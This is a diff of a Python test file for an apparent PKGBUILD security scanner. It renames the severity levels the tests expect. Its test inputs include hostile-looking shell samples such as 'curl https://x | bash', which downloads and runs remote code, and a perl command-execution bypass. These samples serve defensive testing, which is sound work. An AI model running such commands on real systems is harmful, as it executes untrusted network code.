@@ -211,7 +211,7 @@ def test_scan_reports_the_bypasses_that_used_to_pass():
         base + "build() {\n  perl -e 'system(\"id\")'\n}\n",
     ]
     for text in bypasses:
-        assert level_of(scan({"PKGBUILD": text})) != "safe", text
+        assert level_of(scan({"PKGBUILD": text})) != "clear", text
 
 
 def test_unanalyzed_scripts_are_reported_but_data_files_are_not():
@@ -245,7 +245,7 @@ def test_hostile_nesting_is_reported_not_a_crash():
     assert ok is False
     findings = scan({"PKGBUILD": "pkgname=x\nbuild() {\n  " + deep + "\n}\n"})
     assert "unparseable-shell" in {f.rule for f in findings}
-    assert level_of(findings) == "caution"
+    assert level_of(findings) == "info"
 
 
 def test_an_analyzer_failure_keeps_earlier_findings_and_adds_a_warning(monkeypatch):
@@ -258,7 +258,7 @@ def test_an_analyzer_failure_keeps_earlier_findings_and_adds_a_warning(monkeypat
     findings = scan({"PKGBUILD": "pkgname=x\nbuild() {\n  curl https://x | bash\n}\n"})
     rules = {f.rule for f in findings}
     assert {"pipe-to-shell", "analyzer-error"} <= rules
-    assert level_of(findings) == "danger"
+    assert level_of(findings) == "warning"
 
 
 # ---- commands that were noise in the corpus ----
